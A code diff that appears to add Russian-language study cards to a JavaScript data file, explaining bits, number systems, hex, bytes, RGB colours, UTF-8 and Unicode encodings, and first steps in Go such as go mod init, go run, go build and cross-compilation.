+  "Биты и байты": [
+    {
+      title: `Бит`,
+      text: `
+      <b>Бит</b><t>— самая маленькая порция информации: ответ да/нет.</t><b>Сокращает неопределённость вдвое</b><t>(Шеннон, 1948). binary digit</t><br><br>
+      <b>Угадай число от 1 до 8:</b><br>
+      <c>больше 4?  нет → 1–4   1 бит</c><br>
+      <c>больше 2?  да  → 3–4   2 бита</c><br>
+      <c>это 4?     нет → 3     3 бита</c><br>
+      <c>1 бит → 2 варианта · 2 → 4 · 3 → 8 · 8 бит → 256</c><br><br>
+      <b>Физически</b><t>— всё, у чего два надёжно различимых состояния:</t><br>
+      <c>транзистор   ток есть / нет</c><br>
+      <c>диск         магнит север вверх / вниз</c><br>
+      <c>SSD          заряд есть / нет</c><br>
+      <c>оптоволокно  вспышка / темнота</c><br>
+      <t>Два состояния устойчивее к помехам, чем десять уровней напряжения</t>
+      `,
+      id: uuidv4(),
+      tags: "бит байт информация шеннон двоичный да нет транзистор",
+      link: "https://ru.wikipedia.org/wiki/Бит"
+    },
+    {
+      title: `Системы счисления: счётчик пробега`,
+      text: `
+      <t>Правая цифра проходит весь круг своих цифр, сбрасывается в 0 и толкает левую на шаг:</t><br>
+      <c>десятичная  (круг 10):  08 → 09 → 10</c><br>
+      <c>двоичная    (круг 2):   01 → 10</c><br>
+      <c>шестнадц.   (круг 16):  0E → 0F → 10</c><br><br>
+      <b>Вес места</b><t>= сколько шагов правой за один шаг левой:</t><br>
+      <c>десятичная   1  10  100  1000</c><br>
+      <c>двоичная     1   2    4     8   16</c><br>
+      <c>шестнадц.    1  16  256  4096</c><br><br>
+      <c>1011₂ = 8 + 0 + 2 + 1 = 11</c><br><br>
+      <b>Число одно, записи разные.</b><t>Человек считает десятками — 10 пальцев. Машина двойками — у транзистора 2 состояния</t>
+      `,
+      id: uuidv4(),
+      tags: "системы счисления двоичная десятичная шестнадцатеричная вес разряда перенос",
+      link: "https://ru.wikipedia.org/wiki/Позиционная_система_счисления"
+    },
+    {
+      title: `Шестнадцатеричная: короткая запись двоичной`,
+      text: `
+      <c>0 1 2 3 4 5 6 7 8 9 A  B  C  D  E  F</c><br>
+      <c>                    10 11 12 13 14 15</c><br><br>
+      <b>Одна hex-цифра = ровно 4 бита</b><t>— каждую переводим отдельно и склеиваем:</t><br>
+      <c>шестн:      4      1      6</c><br>
+      <c>двоич:   0100   0001   0110</c><br>
+      <c>0x416 = 4 × 256 + 1 × 16 + 6 = 1046</c><br>
+      <c>0xFF  = 15 × 16 + 15 = 255 = 1111 1111</c><br><br>
+      <b>Десятичное → hex, два способа:</b><br>
+      <c>слева направо — «сколько крупных мест влезает» (как размен денег):</c><br>
+      <c>1046 ÷ 256 = 4, остаток 22    → 4</c><br>
+      <c>  22 ÷ 16  = 1, остаток 6     → 1</c><br>
+      <c>   6 ÷ 1   = 6                → 6     итог 416</c><br>
+      <c>справа налево — делим на 16, остатки читаем снизу вверх:</c><br>
+      <c>1046 ÷ 16 = 65, ост 6</c><br>
+      <c>  65 ÷ 16 = 4,  ост 1</c><br>
+      <c>   4 ÷ 16 = 0,  ост 4          → 416</c><br>
+      <t>Остаток — где стоит правое колесо счётчика, частное — сколько раз оно толкнуло левое. Для двоичной так же, только делим на 2</t><br><br>
+      <c>десятичная — сложна для машины</c><br>
+      <c>двоичная   — неудобно читать человеку</c><br>
+      <c>hex        — коротко и ровно ложится на биты</c><br><br>
+      <t>В коде:</t><c>0x416</c><t>(hex),</t><c>0b1011</c><t>(двоичная). Везде: цвета, хеши коммитов, адреса памяти, U+0416</t><br><br>
+      <b>Номер — не количество, а имя.</b><t>U+0416 не «тысяча сорок шесть чего-то», а ярлык буквы, как номер телефона:</t><br>
+      <c>сколько?       → десятичная   10 карточек, 255 ступеней, 8 байт</c><br>
+      <c>какой именно?  → hex          U+0416, #FF6B2C, коммит ea8444a9</c>
+      `,
+      id: uuidv4(),
+      tags: "hex шестнадцатеричная 0x 0b перевод ff 255 4 бита",
+      link: "https://ru.wikipedia.org/wiki/Шестнадцатеричная_система_счисления"
+    },
+    {
+      title: `Байт: почему 8 бит`,
+      text: `
+      <c>бит     0 или 1</c><br>
+      <c>4 бита  = 1 hex-цифра (ниббл)     F  = 1111</c><br>
+      <c>8 бит   = байт = 2 hex-цифры       FF = 1111 1111</c><br>
+      <c>байт: 0–255 (256 значений)        00 — минимум, FF — максимум</c><br><br>
+      <b>Договорённость, а не закон природы.</b><t>В 1950-х байт бывал 6, 7, 9 бит. Восемь закрепила IBM System/360 (1964):</t><br>
+      <t>1. 256 значений — латиница в двух регистрах, цифры, знаки (6 бит дают только 64)</t><br>
+      <t>2. Две десятичные цифры по 4 бита — для банков</t><br>
+      <t>3. 8 = 2 × 2 × 2 — память удобно резать степенями двойки</t><br>
+      <t>Дальше инерция: Intel 8080 и все следующие</t>
+      `,
+      id: uuidv4(),
+      tags: "байт 8 бит ниббл nibble 255 system 360 ibm почему",
+      link: "https://ru.wikipedia.org/wiki/Байт"
+    },
+    {
+      title: `Цвета: три байта яркости`,
+      text: `
+      <c>#FF6B2C</c><t>= три байта: красная, зелёная, синяя лампочка пикселя</t><br>
+      <c>FF = 255   6B = 6 × 16 + 11 = 107   2C = 2 × 16 + 12 = 44</c><br><br>
+      <c>00 = 00000000  лампочка выключена</c><br>
+      <c>FF = 11111111  на полную</c><br><br>
+      <b>Белый</b><c>#FFFFFF</c><t>— все три на полную, свет складывается в белый</t><br>
+      <b>Чёрный</b><c>#000000</c><t>— света нет</t><br>
+      <c>rgb(255, 255, 255) = #FFFFFF</c><t>— одно и то же, десятичная и hex</t><br><br>
+      <t>255 само по себе к белому отношения не имеет: это максимум байта. На яркость договорились отвести байт — 256 ступеней, глаз почти не различает соседние.</t><c>#FFF</c><t>— короткая запись, 4 бита на цвет</t>
+      `,
+      id: uuidv4(),
+      tags: "цвет rgb hex ff 255 белый черный пиксель яркость css",
+      link: "https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color"
+    },
+    {
+      title: `Символы: rune, byte и UTF-8`,
+      text: `
+      <b>U+0416</b><t>— номер Ж в Юникоде (rune).</t><b>D0 96</b><t>— как этот номер записан байтами в UTF-8. Номер квартиры и запись на конверте</t><br><br>
+      <t>Всё в hex — между ними просто перекладываем биты:</t><br>
+      <c>U+0416       4      1      6</c><br>
+      <c>          0100   0001   0110      каждая hex-цифра → 4 бита</c><br>
+      <c>               100 0001 0110      11 значащих бит</c><br>
+      <c>шаблон:   110xxxxx   10xxxxxx</c><br>
+      <c>биты:        10000     010110</c><br>
+      <c>байты:    11010000   10010110</c><br>
+      <c>по 4:     1101 0000  1001 0110</c><br>
+      <c>hex:        D   0      9   6     → D0 96</c><br><br>
+      <b>Метки — как вагоны поезда:</b><br>
+      <c>0xxxxxxx                        1 байт (латиница = ASCII)</c><br>
+      <c>110xxxxx 10xxxxxx               2 байта</c><br>
+      <c>1110xxxx 10xxxxxx 10xxxxxx      3 байта</c><br>
+      <c>11110xxx + 3 × 10xxxxxx         4 байта</c><br>
+      <t>Сколько единиц в начале первого байта — столько байтов в букве.</t><c>10…</c><t>— «я продолжение». Каждый байт сам говорит, где он в ленте</t><br><br>
+      <c>A — 1 байт   Ж — 2 байта   🐹 — 4 байта</c><br>
+      <t>В десятичной то же самое: U+0416 = 1046, D0 96 = 208 150 — посчитано для человека</t><br><br>
+      <f>s</f><c> := </c><v>"Женя"</v><br>
+      <n>len</n><c>(s)</c><k>            // 8 — байты, не буквы</k><br>
+      <c>s[0]</c><k>              // 0xD0 — половина Ж</k><br>
+      <f>for</f><c> i, r := </c><f>range</f><c> s</c><k>  // range собирает байты в rune</k><br>
+      <n>len</n><c>([]rune(s))</c><k>     // 4 — буквы</k>
+      `,
+      id: uuidv4(),
+      tags: "utf-8 rune byte юникод символ кодировка len range go строка",
+      link: "https://go.dev/blog/strings"
+    },
+    {
+      title: `Юникод и кодировки`,
+      text: `
+      <b>Две разные договорённости:</b><br>
+      <c>Юникод    — КАКОЙ номер у символа          Ж → U+0416</c><br>
+      <c>кодировка — КАК номер уложить в байты       U+0416 → D0 96 (UTF-8)</c><br><br>
+      <c>ASCII (1963)    7 бит, 128 символов: латиница, цифры, знаки</c><br>
+      <c>cp1251, KOI8-R  8 бит, 256: вторая половина — под свой алфавит</c><br>
+      <c>Юникод (1991)   одна таблица на весь мир, ~150 000 символов</c><br>
+      <c>UTF-32          всегда 4 байта на символ — просто, но толсто</c><br>
+      <c>UTF-16          2 байта, редкие — 4: JavaScript, Java, Windows</c><br>
+      <c>UTF-8           1–4 байта, латиница = ASCII: веб (98 %+) и Go</c><br><br>
+      <b>Кракозябры</b><t>— записали в одной кодировке, прочитали по другой. Байты те же, договорённость другая:</t><c>Привет → РџСЂРёРІРµС‚</c><br><br>
+      <b>Почему победил UTF-8:</b><t>английский текст байт в байт совпадает с ASCII — старые программы не сломались, а любой символ мира тоже помещается</t>
+      `,
+      id: uuidv4(),
+      tags: "юникод unicode кодировка utf-8 utf-16 utf-32 ascii cp1251 кракозябры",
+      link: "https://ru.wikipedia.org/wiki/Юникод"
+    },
+    {
+      title: `Биты ничего не значат сами`,
+      text: `
+      <t>Машина умеет только вычислять над битами.</t><b>Смысл — договорённость, как их читать:</b><br>
+      <c>байты FF 6B 2C</c><br>
+      <c>  как цвет   → оранжевый</c><br>
+      <c>  как числа  → 255, 107, 44</c><br>
+      <c>  как текст  → мусор (в UTF-8 байт FF невозможен)</c><br><br>
+      <b>Ярлыки, какую договорённость применить:</b><br>
+      <c>расширение   .png .txt .json</c><br>
+      <c>HTTP         Content-Type: application/json</c><br>
+      <c>тип в Go     string или []byte — те же байты, разное обращение</c><br><br>
+      <b>Два масштаба:</b><t>крупно — всё договорённости; мелко — у каждой свои причины (8 бит — влез алфавит, двоичная — у транзистора 2 состояния, UTF-8 — весь мир и не сломать ASCII). Понимание — в переходе между ними</t>
+      `,
+      id: uuidv4(),
+      tags: "биты интерпретация договорённость формат content-type кодировка смысл данных"
+      ,link: "https://ru.wikipedia.org/wiki/Информатика"
+    }
+
+  ],
+  Go: [
+    {
+      title: `Первая программа`,
+      text: `
+      <c>mkdir -p ~/sandbox/bank-go && cd ~/sandbox/bank-go</c><br>
+      <c>go mod init bank</c><k>   // go.mod — как package.json: имя модуля, версия Go, зависимости</k><br><br>
+      <f>package</f><c> </c><n>main</n><br><br>
+      <f>import</f><c> </c><v>"fmt"</v><br><br>
+      <f>func</f><c> </c><n>main</n><c>() {</c><br>
+      <c>	</c><n>fmt</n><c>.</c><n>Println</n><c>(</c><v>"Привет, банк"</v><c>)</c><br>
+      <c>}</c><br><br>
+      <b>package main</b><t>— из него собирается запускаемая программа, а не библиотека</t><br>
+      <b>import "fmt"</b><t>— стандартный пакет печати, встроен</t><br>
+      <b>func main()</b><t>— точка входа, имя фиксировано</t><br>
+      <b>Большая буква = экспорт.</b><c>Println</c><t>виден снаружи пакета,</t><c>println</c><t>— нет. Вместо export из JS</t>
+      `,
+      id: uuidv4(),
+      tags: "go golang package main import fmt func main go mod init экспорт большая буква",
+      link: "https://go.dev/doc/tutorial/getting-started"
+    },
+    {
+      title: `Кавычки: строка, символ, сырая строка`,
+      text: `
+      <f>import</f><c> </c><v>'fmt'</v><k>   // ✗ ошибка: одинарные — это один символ</k><br>
+      <f>import</f><c> </c><v>"fmt"</v><k>   // ✓</k><br><br>
+      <c>"текст"</c><t>— строка (string)</t><br>
+      <c>'a'</c><t>— один символ (rune). Внутри только одна буква</t><br>
+      <c>«обратные кавычки»</c><t>— сырая строка: без экранирования, можно переносить строки. Удобно для SQL и JSON</t><br><br>
+      <t>В JS все три — просто строки, в Go — разные типы</t>
+      `,
+      id: uuidv4(),
+      tags: "go кавычки string rune raw string backtick одинарные двойные",
+      link: "https://go.dev/ref/spec#String_literals"
+    },
+    {
+      title: `go run и go build`,
+      text: `
+      <c>go run main.go</c><k>        // скомпилировать во временную папку и запустить</k><br>
+      <c>go build -o bank</c><k>      // скомпилировать в файл bank (~2 МБ)</k><br>
+      <c>./bank</c><k>                // ./ — текущей папки нет в PATH</k><br><br>
+      <c>Node                          Go</c><br>
+      <c>node main.js                  ./bank</c><br>
+      <c>нужен установленный Node      ничего не нужно — один файл</c><br>
+      <c>JIT при каждом запуске        уже машинный код, старт мгновенно</c><br>
+      <c>node_modules рядом            зависимости и рантайм внутри</c><br><br>
+      <b>Сборка под другую систему</b><t>прямо с мака:</t><br>
+      <c>GOOS=linux GOARCH=amd64 go build -o bank-linux</c><br>
+      <c>file bank-linux</c><k>        // ELF 64-bit x86-64 — для Linux-сервера</k><br><br>
+      <t>Отсюда любовь DevOps: скопировал файл на сервер и запустил. Docker-образ — 10 МБ вместо 200</t>
+      `,
+      id: uuidv4(),
+      tags: "go run build бинарник компиляция goos goarch кросс-компиляция node сравнение",
+      link: "https://go.dev/doc/tutorial/compile-install"
+    },
+    {
+      title: `Редактор и инструменты`,
+      text: `
+      <b>VS Code</b><t>+ расширение Go (от команды Go) — предложит доустановить инструменты</t><br><br>
+      <b>gopls</b><t>— языковой сервер: автодополнение после</t><c>fmt.</c><t>, переход к определению, ошибки на лету. Как TypeScript в VS Code</t><br>
+      <b>gofmt</b><t>— форматирует при сохранении. Один официальный стиль: отступы табами, скобка на той же строке — споров нет</t><br><br>
+      <c>go version</c><k>   // go1.27.3 darwin/arm64 — darwin = macOS, arm64 = Apple Silicon</k><br><br>
+      <t>Версии раз в полгода (февраль и август). Код с Go 1.0 (2012) почти всегда собирается и сейчас. 🐹 в Starship — гофер, талисман Go</t>
+      `,
+      id: uuidv4(),
+      tags: "go vscode gopls gofmt версия инструменты редактор",
+      link: "https://go.dev/doc/editors"
     }
   ],
   Troubles: [
